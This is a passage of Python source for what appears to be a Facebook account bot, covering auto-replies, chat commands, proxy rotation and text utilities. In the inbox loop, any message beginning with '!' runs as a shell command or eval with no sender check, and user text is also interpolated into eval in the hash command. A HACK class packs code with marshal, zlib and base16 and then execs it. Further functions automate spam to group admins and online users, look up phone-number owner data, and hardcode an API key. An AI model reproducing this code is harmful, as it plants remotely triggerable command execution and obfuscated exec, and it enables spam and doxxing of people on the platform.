          T = bs(self.s.post(x['action'],data).content,'html.parser')
          self.oid = T.find('form').input['value']
        except:
          self.oid = html.find('form').input['value']



    def save(self,file):
      try:
        with open(file,'w') as F:
          print('[*] Saved to {} Bytes to {}'.format(file,F.write(self.html)))
      except: print('[*] Saving Failed !')
          
    def wikisearch(self,text):
       data = "";i=0
       WL = 'https://https-en-m-wikipedia-org.0.freebasics.com/wiki/{}?iorgbsid={}'
       r = self.s.get(WL.format(text,self.oid))
       D = bs(r.content,'html.parser')
       self.html=str(D)
       HD = D.find_all('p')
       for X in HD:
         try: data+=X.get_text()
         except: pass
       return data


'''

    CLASS BOT
    Pass FB() object to BOT
    a = FB()
    a.setemail('xyz')
    a.setpasswd('xyz')
    a.login()
    b = BOT(a)
    

'''


class BOT:
  def __init__(self,A):
    self.B_ = A
    self.myname = A.getname()
    self.myid = A.getaccountid()
    
  def CommentMathBOT(self,grouplink):
   old = []
   while True:
    try:
      a = self.B_.getcomments(grouplink)
      for G in range(len(a.keys())):
       Z = a[G]
       if Z['name'] != self.myname and Z['text']+Z['name'] not in old and Z['name']:
        sid = int(Z['id'])
        reply = '''Question : {}\nAnswer : {}
        '''.format(Z['text'],MSolv(Z['text']))
        print("[*] Comment from {} Replied.. ".format(Z['name']))
        link = self.B_.url.format(Z['clink'])
        self.B_.comment(reply,link)
        old.append(Z['text']+Z['name'])
        #print('[*] {} | {}'.format(Z['name'],Z['text']))
    except: pass


  def RuleCommentBOT(self,grouplink,rule):
     old = []
     while True:
      try:
        a = self.B_.getcomments(grouplink)
        for G in range(len(a.keys())):
         Z = a[G]
         if Z['name'] != self.myname and Z['text'] not in old and Z['name']:
          sid = int(Z['id'])
          reply = '''{}'''.format(rule.get(Z['text']))
          print("[*] Comment from {} Replied.. ".format(Z['name']))
          link = self.B_.url.format(Z['clink'])
          self.B_.comment(reply,link)
          old.append(Z['text'])
          #print('[*] {} | {}'.format(Z['name'],Z['text']))
      except: pass

  def BinaryCommentBOT(self,grouplink):
       old = []
       while True:
        try:
          a = self.B_.getcomments(grouplink)
          for G in range(len(a.keys())):
           Z = a[G]
           if Z['name'] != self.myname and Z['text'] not in old and Z['name']:
            if '1' in Z['text'] and '0' in Z['text']:
             try:
              msg_r = "".join([chr(int(binary, 2)) for binary in Z['text'].split(" ")])
             except: msg_r = ''
            else:
             try:
               msg_r = ' '.join(format(x, 'b') for x in bytearray(Z['text'], 'utf-8'))
             except: msg_r = ''
            #reply = '''{}'''.format(rule.get(Z['text']))
            print("[*] Comment from {} Replied.. ".format(Z['name']))
            link = self.B_.url.format(Z['clink'])
            self.B_.comment(msg_r,link)
            old.append(Z['text'])
            #print('[*] {} | {}'.format(Z['name'],Z['text']))
        except: pass

  def InboxMathBOT(self):
   nbot.bootstrap(learnFiles="startup.xml", commands="load alice",chdir=nchdir)
   now = int(time.ctime().split(' ')[3].split(':')[0])
   users = []
   keywords = ['news','image','picture']
   npages = [ 'arynewsasia', 'GeoUrduDotTv', '92NewsHD', 'wonderphy6', 'math.boxes', 'map.lb', 'ScienceMagazine', 'NASA']
   SE_I = 0
   groups = self.B_.getmygroups()
   greet = """|

Hey  {} How are you !

   """
   Mgreet = '\n'.join(greet.split('\n')[4:])
   block = 0
   cblock = 0
   sblock = 1
   gblock = 1
   fblock = 0
   me = self.B_.s.cookies.get_dict()['c_user']
   users = []
   busers = []
   while True:
    SE_I+=1
    while True:
     try:   
      if now == int(time.ctime().split(' ')[3].split(':')[0]):
            now = int(time.ctime().split(' ')[3].split(':')[0])+1
            if sblock == 0:
              try:
               page = choice(npages)
               print(page)
               LIN = choice(self.B_.getpageposts(page,10))#.split('&refid')[0]
               print(LIN)
               data = self.B_.postdata(LIN)
               print(data)
               TEXT = """
 [ Powered By N-AI BoT ]
   #AI-AUTOMATED_SHARE 

#TIME : {} USA
#ID : {}
#TEXT : {}
               """.format(time.ctime(),data.get('id'),data.get('text'))
               self.B_.share(LIN,TEXT)
               print('POST DONE AT {}'.format(time.ctime()))
              except: 
                  print('FAILED TO POST...') 
            
            if gblock == 0:
             try:
              G = choice(groups)
              GAD = self.B_.getgroupadmins(G['id'])
              for x in GAD.keys():
                  guser = GAD[x]['name']
                  gid = GAD[x]['id']
                  users.append(gid)
                  self.B_.fbsend(greet.format(G['name']),gid)  
             except:
                print('Failed to Message')
     
      print("SESSION NOW : {}".format(SE_I))
      M = self.B_.newmsgs()
      print(M)
      if len(M.keys()) > 3:
       for k in range(len(M.keys())):
        rmsg = M[k].get('msg')
        ID = M[k].get('ID')
        name = M[k].get('name')
        link = M[k].get('link')
        print(ID,rmsg)
        if rmsg[0] != '|' and rmsg[0] != '%' and rmsg[0] != '!' and block == 0 and ID not in busers:
           if rmsg.split(' ')[0].lower() in ['search','what','define'] and len(rmsg.split(' ')) > 1 and len(re.findall(r'[0-9]',rmsg)) == 0 and 'you' not in rmsg:
              H = [
                'What is ',
                'what is ',
                'Define ',
                'define ',
                'Search ',
                'search '
              ]
              ss = rmsg
              for i in H:
                ss = ss.replace(i,'')   
                  
              try: ans = wikipedia.summary(ss)
              except: ans = 'I dont know !'
              print(link)
              self.B_.sendmsg(link,'| {}'.format(ans)   )
              print('[*] {} | {} --> {} '.format(ID,name,ans))   
         
           elif rmsg[0:2]=='03' or rmsg[0:3]=='+92' and len(re.findall(r'0|1',rmsg[1:])) < len(''.join(rmsg.split(' '))):
             ans = phone(''.join(rmsg.split(' ')))
             print(link)
             self.B_.sendmsg(link,'| {}'.format(ans)   )
             print('[*] {} | {} --> {} '.format(ID,name,ans))   
        
           elif rmsg.split(' ')[0].lower() == 'news':
             news = ''
             npages = [
                'bbcurdu',
                'arynewsasia',
                'GeoUrduDotTv',
                '92NewsHD',
                'dw.urdu'
             ]
             newsl = self.B_.getpageposts(choice(npages),5)
             nposts = list(map(self.B_.postdata,newsl))
             for x in nposts:
               try: news+='{} : {}\n'.format(x['id'],x['text'])
               except: pass
             ans = news   
             print(link)
             self.B_.sendmsg(link,'| {}'.format(ans))
             print('[*] {} | {} --> {} '.format(ID,name,ans))   
        
           elif rmsg.split(' ')[0].lower() in ['image','picture','show'] and len(rmsg.split(' ')) >= 2:
             ims = rmsg.lower()
             ans = ''
             H = [
               'image search for ',
               'image of ',
               'picture of ',
               'image ',
               'picture ',
               'show me ',
               'show '
                ]
             for i in H:
               ims = ims.replace(i,'')
               
             AF = lambda x : True if x=='show' else False
             try: downloader.download(ims,1,adult_filter_off=AF(rmsg.split(' ')[0].lower()),timeout=60)
             except: pass
           
             file = os.listdir('dataset/{}'.format(ims))
             text = '|Image of {}'.format(ims)
             print(file)
             '''
             try:
              image_file = 'dataset/{}/{}'.format(ims,file[0])
              image = cv2.imread(image_file)
              output = image.copy()
              height, width = image.shape[:2]
              # Stamp the image lower right corner and write it
              namestamp = "Nasir-AI"
              cv2.putText(output, namestamp, (width-400, height-24), cv2.FONT_HERSHEY_PLAIN, 3.5, (255,0,0), thickness=3)
              cv2.imwrite(image_file, output)
             except: pass
             '''
             IMM = self.B_.imagesend(link,'dataset/{}/{}'.format(ims,file[0]))
             print(IMM.url)
             
           
           
           elif rmsg.split(' ')[0].lower() == 'text2image':
             ims = rmsg.split(' ')[0]
             text = rmsg.replace(ims+' ','')
             try:
               genimg(text,'text.jpg')
               self.B_.imagesend(link,'text.jpg')
             except:
               self.B_.sendmsg(link,'| Unable to Generate Image')
             
           elif rmsg.split(' ')[0].lower() == 'translate':
              H = [
                  'Translate ',
                  'translate '
                  ]
              ss = rmsg
              for i in H:
                ss = ss.replace(i,'')    
                
              ans = Translator().translate(ss).text
              print(link)
              self.B_.sendmsg(link,'| {}'.format(ans)   )
              print('[*] {} | {} --> {} '.format(ID,name,ans))     
              
           elif rmsg.split(' ')[0].lower() == 'post':
              H = [
                  'post url ',
                  'post '
                  ]
              ss = rmsg
              for i in H:
                ss = ss.replace(i,'')  
              
              surl = ss.split(' ')[0]
              parm = json.loads(' '.join(ss.split(' ')[2:]))
              ans = bs(self.B_.s.post(surl,parm).content,'html.parser').get_text()
              print(link)
              self.B_.sendmsg(link,'| {}'.format(ans))
              print('[*] {} | {} '.format(ID,name))
              
           elif rmsg.split(' ')[0].lower() == 'get':
              H = [
                  'get url ',
                  'get '
                  ]
              ss = rmsg
              for i in H:
                ss = ss.replace(i,'')  
              
              ans = bs(self.B_.s.get(ss).content,'html.parser').get_text()
              print(link)
              self.B_.sendmsg(link,'| {}'.format(ans))
              print('[*] {} | {} '.format(ID,name))
              
           elif rmsg.split(' ')[0].lower() == 'meaning':
              H = [
                  'meaning of ',
                  'meaning '
                  ]
              ss = rmsg.lower()
              for i in H:
                ss = ss.replace(i,'')  
              
              ans = '' 
              try:
               D = dictionary.meaning(ss)
               for x in D.keys():
                 ans+= "{} : ".format(x.upper())
                 for y in D.get(x):
                    ans+='{}\n'.format(y)
                 ans+='\n'
    
               print(link)
               self.B_.sendmsg(link,'| {}'.format(ans))
               print('[*] {} | {} '.format(ID,name))
              except: self.B_.sendmsg(link,'| Not Found !')
           
           elif rmsg.split(' ')[0].lower() == 'synonym':
              H = [
                  'synonym of ',
                  'synonym '
                  ]
              ss = rmsg.lower()
              for i in H:
                ss = ss.replace(i,'')  
              
              ans = '' 
              try:
               D = dictionary.synonym(ss)
               for x in D:
                 ans+= "{}\n".format(x)
    
               print(link)
               self.B_.sendmsg(link,'| {}'.format(ans))
               print('[*] {} | {} '.format(ID,name))
              except: self.B_.sendmsg(link,'| Not Found !')
          
           elif rmsg.split(' ')[0].lower() == 'antonym':
              H = [
                  'antonym of ',
                  'antonym '
                  ]
              ss = rmsg.lower()
              for i in H:
                ss = ss.replace(i,'')  
              
              ans = '' 
              try:
               D = dictionary.antonym(ss)
               for x in D:
                 ans+= "{}\n".format(x)
    
               print(link)
               self.B_.sendmsg(link,'| {}'.format(ans))
               print('[*] {} | {} '.format(ID,name))
              except: self.B_.sendmsg(link,'| Not Found !')
           
           elif rmsg.split(' ')[0].lower() == 'binary':
              H = [
                  'Binary of ',
                  'binary of ',
                  'Binary ',
                  'binary '
                  ]
              ss = rmsg
              for i in H:
                ss = ss.replace(i,'')  
              
              try:
               ans = ' '.join(format(x, 'b') for x in bytearray(ss, 'utf-8'))
               print(link)
               self.B_.sendmsg(link,'| {}'.format(ans))
               print('[*] {} | {} '.format(ID,name))
              except: self.B_.sendmsg(link,'| Cannot Convert to Binary !')
           
           elif len(re.findall(r'0|1',rmsg)) == len(''.join(rmsg.split(' '))):
              try:
               ans = "".join([chr(int(binary, 2)) for binary in rmsg.split(" ")])
               print(link)
               self.B_.sendmsg(link,'| Binary To Text :  {}'.format(ans))
               print('[*] {} | {} '.format(ID,name))
              except: self.B_.sendmsg(link,'| Cannot Convert Binary to Text!')
           
           
           elif rmsg.split(' ')[0].lower() == 'urlshortner':
              try:
               ans = self.B_.genlink(rmsg.split(' ')[1])
               print(link)
               rans = ''
               for x in ans.keys():
                   rans+='{} : {}\n'.format(x.upper(),ans[x])
                   
               self.B_.sendmsg(link,'| {}'.format(rans))
               print('[*] {} | {} '.format(ID,name))
              except: self.B_.sendmsg(link,'| Cannot Shorten Url!')
      
           
           elif rmsg.split(' ')[0].lower() == 'cricket':
              try:
               CM = rmsg.split(' ')[1].lower()
               if CM == 'matches':
                  ans = Cricbuzz().matches()
                  rans = json.dumps(ans,indent=4)
                  self.B_.sendmsg(link,'| {}'.format(rans))
                  print('[*] {} | {} '.format(ID,name))
                  
               if CM == 'matchinfo':
                  ans = Cricbuzz().matchinfo(Cricbuzz().matches()[0]['id'])
                  rans = json.dumps(ans,indent=4)
                  self.B_.sendmsg(link,'| {}'.format(rans))
                  print('[*] {} | {} '.format(ID,name))
               
               if CM == 'livescore':
                  try:
                   self.B_.sendmsg(link,'| {}'.format(getscore()))
                   print('[*] {} | {} '.format(ID,name))
                  except: self.B_.sendmsg(link,'| Cannot Get LiveScore!')
                   
              except: self.B_.sendmsg(link,'| Cannot Get Cricket Data!')
             
           elif rmsg.split(' ')[0].lower() in hashlib.algorithms_available:
              htyp = rmsg.split(' ')[0]
              print(htyp)
              ss = rmsg.replace('{} '.format(htyp),'')
              H = eval('hashlib.{}("{}".encode("utf-8")).hexdigest()'.format(htyp.lower(),ss))
              ans = "{} HASH : {}".format(htyp,H)
              print(ans)
              print(link)
              self.B_.sendmsg(link,'| {}'.format(ans))
              print('[*] {} | {} '.format(ID,name))
               
           else:
            ans = MSolv(rmsg,ID)
            if str(ans) != 'None' and cblock == 0:
             print(link)
             self.B_.sendmsg(link,'| {}'.format(ans)   )
             print('[*] {} | {} --> {} '.format(ID,name,ans))   
        
        if rmsg.split(' ')[0].lower() == '%block':
              try:
               ans = ''.join(rmsg.split(' ')[1:]).split('\n')
               for x in ans:
                  busers.append(x)
                  
               rans = '| USERS BLOCKED\n {}'.format(json.dumps(busers,indent=4))
               self.B_.sendmsg(link,rans)
               print('[*] {} | {} '.format(ID,name))
              except:
               self.B_.sendmsg(link,'| Cannot Block USER ')
        
        if rmsg.split(' ')[0].lower() == '%unblock':
              try:
               ans = ''.join(rmsg.split(' ')[1:]).split('\n')
               for x in ans:
                  try: busers.remove(x)
                  except: pass
              
               rans = '| USERS UNBLOCKED\n {}'.format(json.dumps(ans,indent=4))
               self.B_.sendmsg(link,rans)
               print('[*] {} | {} '.format(ID,name))
              except:
               self.B_.sendmsg(link,'| Cannot Unblock USER ')
       
       
        if rmsg.split(' ')[0].lower() == '%thisblock':
              try:
               busers.append(ID)
               rans = '| BLOCKED : {}'.format(ID)
               self.B_.sendmsg(link,rans)
               print('[*] {} | {} '.format(name,ID))
              except:
               self.B_.sendmsg(link,'| Cannot Block USER ')
        
        if rmsg.split(' ')[0].lower() == '%thisunblock':
              try:
               busers.remove(ID)
               rans = '| UNBLOCKED : {}'.format(ID)
               self.B_.sendmsg(link,rans)
               print('[*] {} | {} '.format(ID,name))
              except:
               self.B_.sendmsg(link,'| Cannot Unblock USER ')
       
        
        if rmsg.split(' ')[0].lower() == '%id':
              try:
               rans = '| NAME : {}\n ID : {}'.format(name,ID)
               self.B_.sendmsg(link,rans)
               print('[*] {} | {} '.format(ID,name))
              except:
               self.B_.sendmsg(link,'| Cannot Get USER ID')
               
        if rmsg.split(' ')[0].lower() == '%getcomments':
              XURL = rmsg.split(' ')[1]
              try:
               rans = '| COMMENTS \n {}'.format(json.dumps(self.B_.getcomments(XURL),indent=4))
               self.B_.sendmsg(link,rans)
               print('[*] {} | {} '.format(ID,name))
              except:
               self.B_.sendmsg(link,'| Cannot Get Comments')
       
        if rmsg.split(' ')[0].lower() == '%getip':
              XURL = rmsg.split(' ')[1]
              try:
               r = get('https://api.ipgeolocation.io/ipgeo?apiKey=39a3a00f47ec446fa81f75679e6c0141&ip={}'.format(XURL))
               XIP = json.dumps(json.loads(r.text),indent=4)
               rans = '| IP \n {}'.format(XIP)
               self.B_.sendmsg(link,rans)
               print('[*] {} | {} '.format(ID,name))
              except:
               self.B_.sendmsg(link,'| Cannot Get IP')
       
        if rmsg.split(' ')[0].lower() == '%getmygroups':
              try:
               rans = '| GROUPS \n {}'.format(json.dumps(self.B_.getmygroups(),indent=4))
               self.B_.sendmsg(link,rans)
               print('[*] {} | {} '.format(ID,name))
              except:
               self.B_.sendmsg(link,'| Cannot Get Groups')
       
        if rmsg.split(' ')[0].lower() == '%notifications':
              try:
               rans = '| NOTIFICATIONS \n {}'.format(json.dumps(self.B_.notification(),indent=4))
               self.B_.sendmsg(link,rans)
               print('[*] {} | {} '.format(ID,name))
              except:
               self.B_.sendmsg(link,'| Cannot Get Notifications')
         
        if rmsg.split(' ')[0].lower() == '%getonline':
              try:
               rans = '| Online \n {}'.format(json.dumps(self.B_.getonline(),indent=4))
               self.B_.sendmsg(link,rans)
               print('[*] {} | {} '.format(ID,name))
              except:
               self.B_.sendmsg(link,'| Cannot Get Online Users')
        
        if rmsg.split(' ')[0].lower() == '%getgroupadmins':
              try:
               XURL = rmsg.split(' ')[1]
               rans = '| GROUP-ADMINS \n {}'.format(json.dumps(self.B_.getgroupadmins(XURL),indent=4))
               self.B_.sendmsg(link,rans)
               print('[*] {} | {} '.format(ID,name))
              except:
               self.B_.sendmsg(link,'| Cannot Get Online Users')
        
        
        if rmsg.split(' ')[0].lower() == '%asend':
              res = ''
              try:
               MS = rmsg.split(' ')[1:]
               ONL = self.B_.getonline()
               for x in ONL:
                 self.B_.fbsend(MS,x)
                 print('[*] {} | {} '.format(ID,name))
               
               self.B_.sendmsg(link,'| Sent Messages to {} Users '.format(ONL))
              except:
               self.B_.sendmsg(link,'| Cannot Message Online Users')
          
         
        if rmsg[0]=='!':
             cmd = rmsg
             cmd = cmd.replace('!','')
             ans = ''
             if rmsg[1] != '!':
              try: 
               out = "| {}".format(os.popen(cmd).read())
               self.B_.sendmsg(link,out)
              except:
               self.B_.sendmsg(link,'| ERROR : Invalid Command')
               
             if rmsg[1] == '!':
              try: 
               out = "| {}".format(eval(cmd))
               self.B_.sendmsg(link,out)
              except:
               self.B_.sendmsg(link,'| ERROR : Invalid Command')
           
           
           
        if rmsg.split(' ')[0].lower() == '%fbsend':
              try:
               ans = self.B_.fbsend(rmsg.split(' ')[2:],rmsg.split(' ')[1])
               print(link)
               rans = ''
               for x in ans.keys():
                   rans+='{} : {}\n'.format(x.upper(),ans[x])
                   
               self.B_.sendmsg(link,'| {}'.format(rans))
               print('[*] {} | {} '.format(ID,name))
              except: self.B_.sendmsg(link,'| Cannot Send Message!')
        
        if rmsg.split(' ')[0].lower() == '%greet':
              try:
               ans = ''.join(rmsg.split(' ')[1:]).split('\n')
               rans = '| {}'.format(Mgreet.format(''))
               for x in ans:
                 self.B_.fbsend(rans,x)
                 print('[*] {} | {} '.format(ID,name))
                 
              except: self.B_.sendmsg(link,'| Cannot Greet')
           
          
        if rmsg.split(' ')[0].lower() == '%fbhack':
              try:
               ans = ''.join(rmsg.split(' ')[1:]).split('\n')
               rans = '| {}'.format(json.dumps(ans,indent=4))
               self.B_.sendmsg(link,rans)
               print('[*] {} | {} '.format(ID,name))
              except: self.B_.sendmsg(link,'| Cannot Run FB-Hack')
        
        
        if cblock == 0 and rmsg.split(' ')[0] == '%chatoff':
           cblock = 1
           self.B_.fbsend('| N-AI BoT Chat Deactivated ! ',me)
           
        if cblock != 0 and rmsg.split(' ')[0] == '%chaton':
           cblock = 0
           self.B_.fbsend('| N-AI BoT Chat Activated ! ',me)
        
        
        if block == 0 and rmsg.split(' ')[0] == '%nbotstop':
           block = 1
           self.B_.fbsend('| N-AI BoT Deactivated ! ',me)
           
        if block != 0 and rmsg.split(' ')[0] == '%nbotstart':
           block = 0
           self.B_.fbsend('| N-AI BoT Activated ! ',me)
        
        if sblock == 0 and rmsg.split(' ')[0] == '%sharestop':
           sblock = 1
           self.B_.fbsend('| Sharing Deactivated ! ',me)
           
        if sblock != 0 and rmsg.split(' ')[0] == '%sharestart':
           sblock = 0
           self.B_.fbsend('| Sharing Activated ! ',me)
        
        if gblock == 0 and rmsg.split(' ')[0] == '%invitestop':
           gblock = 1
           self.B_.fbsend('| Group Invite Deactivated ! ',me)
           
        if gblock != 0 and rmsg.split(' ')[0] == '%invitestart':
           gblock = 0
           self.B_.fbsend('| Group Invite Activated ! ',me)
        
        if fblock == 0 and rmsg.split(' ')[0] == '%minvitestop':
           fblock = 1
           users = []
           self.B_.fbsend('| Messages Invite Deactivated ! ',me)
           
        if fblock != 0 and rmsg.split(' ')[0] == '%minvitestart':
           fblock = 0
           self.B_.fbsend('| Messages  Invite Activated ! ',me)
        
        
        if ID not in users and fblock == 0 and rmsg[0] == '|':
            users.append(ID)
         
        if ID not in users and fblock == 0 and rmsg[0] != '|':
           mrep = '| {}'.format(Mgreet.format(name))
           users.append(ID)
           #self.B_.sendmsg(link,mrep)
    
     except: print('ERROR INSIDE LOOP')    
        
  def RuleInboxBOT(self,rule):
      while True:
       try:
        M = self.B_.newmsgs()
        #k=0
        for k in range(len(M.keys())):
         try:
          rmsg = M[k].get('msg')
          ID = M[k].get('ID')
          if rmsg[0] != '|':
           if ID==self.myid:
             ID=M[k].get('ID2')
           ans = rule.get(rmsg.lower())
           mrep = '|{}'.format(ans)
           self.B_.fbsend(mrep,ID)
           print('[*] {} | {} --> {} '.format(ID,M[k]['name'],ans))
         except: pass
       except: pass



class MP:
  def __init__(self,pool):
     import concurrent.futures
     self.pool = pool
     self.m = concurrent.futures.ThreadPoolExecutor(max_workers=self.pool)

  def run(self,f,L):
    return self.m.map(f,L)


class PROXY:
  def __init__(self):
    self.proxylist = [
    {'https':'199.195.248.24:8080'},
    {'https':'103.86.187.242:23500'},
    {'https':'103.149.9.2:8080'},
    {'https':'138.197.102.119:80'},
    {'https':'13.92.6.80:3128'},
    {'https':'45.63.14.189:8080'},
    {'https':'67.205.151.68:8080'},
    {'https':'149.28.235.52:8080'},
    {'https':'198.50.177.44:44699'},
    {'https':'161.35.112.151:3128'},
    {'https':'45.77.76.254:8080'},
    {'https':'137.220.52.72:8080'},
    {'https':'149.28.50.175:8080'},
    {'https':'165.225.38.32:10605'},
    {'https':'8.9.31.198:8080'},
    {'https':'52.179.231.206:80'},                                        {'https':'45.77.151.131:8080'},
    {'https':'147.75.51.179:3128'},
    {'https':'167.99.181.81:3128'},
    {'https':'155.138.150.235:8080'},
    {'https':'162.243.210.52:6411'},
    {'https':'104.251.210.103:3128'},
    {'https':'144.121.255.37:8080'},
    {'https':'149.56.1.48:8181'},
    {'https':'71.174.241.163:3128'},
    {'https':'148.153.11.58:39593'},
    {'https':'134.122.26.80:3128'},
    {'https':'167.99.177.76:8080'},
    {'https':'3.19.238.16:3128'},
    {'https':'168.169.96.14:8080'},
    {'https':'207.237.148.14:38694'},
    {'https':'64.235.204.107:8080'},
    {'https':'155.138.142.213:8080'}
    ]
    
  def getproxy(self):
    return choice(self.proxylist)
  



class WEB:
  def __init__(self):
    self.url = ''
    self.html = ''
    self.s = Session()
    self.agent = {
          "Accept-Language": "en-US,en;q=0.5",
          "user-agent":Faker().user_agent()
                }
    self.s.headers.update(self.agent)
    self.data = {}
    self.content = ''
    
  def showhtml(self):
    return self.html

  def seturl(self,url):
    self.url=url
    return url

  def writehtml(self,path):  
   with open(path,'w') as x:
     print('{} bytes written ..'.format(x.write(self.content)))   

  def getcookie(self):                                     
    try:
      return self.s.cookies.get_dict()                       
    except: pass                                                                     
                                                
  def setcookie(self,cookie):                               
    with open(cookie,'r') as C:
      try: self.s.cookies.update(json.loads(C.read()))       
      except: pass
  
  def getkey(self): 
   try:                                       
    key = json.dumps(self.s.cookies.get_dict())
    return base64.b16encode(key.encode('utf-8'))
   except: pass 
                
  def setkey(self,key):  
   try:                                     
    K = json.loads(base64.b16decode(key.encode('utf-8')))
    self.s.cookies.update(K)
   except: pass
   
  def setuseragent(self,agent):                            
     try: self.s.headers.update(agent)
     except: pass  
                                              
  def savecookie(self,name):                               
    try:
      with open(name,'w') as C:                             
        C.write(json.dumps(self.cookie.get_dict()))
    except: pass

  def setproxy(self,proxy):                                 
    try: self.s.proxies=proxy
    except: pass

  def fetch(self,TYPE,DATA):
    if TYPE.upper() == 'GET':
     try:
      r = self.s.get(self.url)
      self.content = r.text
      self.html = bs(r.content,'html.parser')
      return r
     except: pass
    elif TYPE.upper() == 'POST':
     try:
      r = self.s.post(self.url,DATA)
      self.content = r.text
      self.html = bs(r.content,'html.parser')
      return r
     except: pass

  def getform(self,INDEX):
    data={}
    F = self.html.find_all('form')[INDEX]
    for x in F.find_all('input'):
       try: data[x['name']]=x['value']
       except: pass
       
    try: data['action'] = F['action']
    except: pass
    return data    
    
  def getinput(self,INDEX):
   data={}
   F = self.html.find_all('form')[INDEX]
   for x in F.find_all('input'):
     try: 
       data[x['name']]=''
       try: data[x['name']]=x['value']
       except: pass
     except: pass
   return data

  def html2text(self):
    return self.html.get_text()

  def getlinks(self):
    data = []
    L = self.html.find_all('a')
    for x in L:
      try:
        if x['href']:
          data.append(x['href'])
      except: pass
    return data



class COLOR:
  def __init__(self):
    #Colours Defined Variables  
    self.W  = '\033[1;37m'        
    self.N  = '\033[0m'                                                       
    self.R  = "\033[1;37m\033[31m"
    self.B  = '\033[1;37m\033[34m'
    self.G  = '\033[1;32m'
    self.Y  = '\033[1;33;40m'                                                   
    #Decorators                        
    self.SRO = self.W+"("+self.R+">"+self.W+")"   
    self.SGO = self.W+"("+self.G+">"+self.W+")"
    self.SBG = '\x1b[1;37m(\x1b[1;32m\xe2\x97\x8f\x1b[1;37m)'
    self.SBR = '\x1b[1;37m(\x1b[1;37m\x1b[31m\xe2\x97\x8f\x1b[1;37m)'

  def red(self): return self.R
  def neon(self): return self.N
  def blue(self): return self.B
  def yellow(self): return self.Y
  def green(self): return self.G
  def white(self): return self.W

  def greentick(self): return self.SGO
  def redtick(self): return self.SRO

  def greendot(self): return self.SBG
  def reddot(self): return self.SBR




class HACK:
  def __init__(self):
     import zlib
     import marshal
     self.zlib=zlib
     self.marshal=marshal
     
  def getip(self,ip):
   r = get("http://api.hostip.info/get_html.php?ip={}&position=true".format(ip))
   print('----'*10+'\n')
   print(r.text)
   print('----'*10)

  def encrypt(self,message):
      S=''
      for Z in message:
        S=S+chr(ord(Z)+2)
      return S
                                                                        
  def decrypt(self,message):
      S=''
      for Z in message:
        S=S+chr(ord(Z)-2)
      return S

  #Encypt Code String
  def NENC(self,code):
   xdat = base64.b16encode(code.encode('utf-8'))
   return self.marshal.dumps(self.zlib.compress(xdat))
  
  #Decyot and Run Code String
  def NRUN(self,code):
    exec(base64.b16decode(self.zlib.decompress(self.marshal.loads(code))))


  def phonenumdata(self,n):
    try:
      if len(n)==11:
             n = n[1:]
      elif len(n)==13:
        if '+92' in n:
          n = n[3:]
      elif len(n)==12:
        if '92' in n:
          n = n[2:]
      data = {'cnnum':str(n)}
      r = Session().post('https://livetrackerga.com/sim/search-result.php',data)
      html = bs(r.content,'html.parser')
      dat = html.find('div',attrs={'role':'alert'})
      bsH = dat.find('table')
      results = {}
      for row in bsH.findAll('tr'):
         aux = row.findAll('td')
         results[aux[0].string] = aux[1].string
      PD = ""
      for c in results.keys():
         PD+=c.upper()+' : '+results.get(c).upper()+'\n'
      return PD
    except:
         return 'Not Found !'


class TEXT:
  def __init__(self):
    import pyfiglet
    self.letters = list('abcdefghijklmnopqrstuvwxyz')
    self.pyfiglet = pyfiglet
    self.font = 'standard'

  def textart(self,text):
    return self.pyfiglet.figlet_format(text, font = self.font )

  def textartfont(self,font):
    self.font = font
    return font
    
  #Reverse Text
  def revtext(self,text):
   return text[::-1]

  #LETTERS IN TEXT COUNT
  def letterscount(self,text):
    data = {}
    for x in self.letters:
      data[x] = text.lower().count(x)
    return data

  #Reverse Array
  def revarray(self,array):
    return array[::-1]

  def remove_duplicates(self,sentence):
      """
      Remove duplicates from sentence
      >>> remove_duplicates("Python is great and Java is also great")                                             'Java Python also and great is'
      """
      return " ".join(sorted(set(sentence.split(" "))))

  def naive_pattern_search(self,s, pattern):
      """
      >>> naive_pattern_search("ABAAABCDBBABCDDEBCABC", "ABC")
      [4, 10, 18]
      >>> naive_pattern_search("ABC", "ABAAABCDBBABCDDEBCABC")
      []
      >>> naive_pattern_search("", "ABC")
      []
      >>> naive_pattern_search("TEST", "TEST")
      [0]
      >>> naive_pattern_search("ABCDEGFTEST", "TEST")
      [7]
      """
      pat_len = len(pattern)
      position = []
      for i in range(len(s) - pat_len + 1):
          match_found = True
          for j in range(pat_len):
              if s[i + j] != pattern[j]:
                  match_found = False
                  break
          if match_found:
              position.append(i)
      return position

  
  
  def bsearch(self,_list, target):
   if type(_list) is not list:
      raise TypeError("binary search only excepts lists, not {}".format(str(type(_list))))
  
  # First position of the list
   left = 0
  # Last position of the list
   right = len(_list) - 1
  
   try:
      # you can also write while True condition
      while left <= right:
          mid = (left + right) // 2
          if target == _list[mid]:
              return mid
          elif target < _list[mid]:
              right = mid - 1
          else:
              left = mid + 1
      return False
   except TypeError:
      return False
  
  def revowel(self,s):
      vowels = "AEIOUaeiou"
      i, j = 0, len(s)-1
      s = list(s)
      while i < j:
          while i < j and s[i] not in vowels:
              i += 1
          while i < j and s[j] not in vowels:
              j -= 1
          s[i], s[j] = s[j], s[i]
          i, j = i + 1, j - 1
      return "".join(s)
  
  def samewords(self,strs):
      '''
  ["eat", "tea", "tan", "ate", "nat", "bat"],
  #Output : [['eat', 'tea', 'ate'], ['tan', 'nat'], ['bat']]
      '''
      d = {}
      ans = []
      k = 0
      for str in strs:
          sstr = ''.join(sorted(str))
          if sstr not in d:
              d[sstr] = k
              k += 1
              ans.append([])
              ans[-1].append(str)
          else:
              ans[d[sstr]].append(str)
      return ans
  
  
  def dprint(self,dictionary):
      for index in dictionary.keys():
       try:
          print("{} : {}".format(index,dictionary[index]))
       except:
          pass
  
  def spattern(self,pattern, string):
      """
      :type pattern: str
      :type string: str
      :rtype: bool
      """
      def backtrack(pattern, string, dic):
  
          if len(pattern) == 0 and len(string) > 0:
              return False
  
          if len(pattern) == len(string) == 0:
              return True
  
          for end in range(1, len(string)-len(pattern)+2):
              if pattern[0] not in dic and string[:end] not in dic.values():
                  dic[pattern[0]] = string[:end]
                  if backtrack(pattern[1:], string[end:], dic):
                      return True
                  del dic[pattern[0]]
              elif pattern[0] in dic and dic[pattern[0]] == string[:end]:
                  if backtrack(pattern[1:], string[end:], dic):
                      return True
          return False
  
      return backtrack(pattern, string, {})
  
  
  def permute(self,elements):
      """
          iterator: returns a perumation by each call.
      """
      if len(elements) <= 1:
          yield elements
      else:
          for perm in permute_iter(elements[1:]):
              for i in range(len(elements)):
                  yield perm[:i] + elements[0:1] + perm[i:]
  
  def upermute(self,nums):
      perms = [[]]
      for n in nums:
          new_perms = []
          for l in perms:
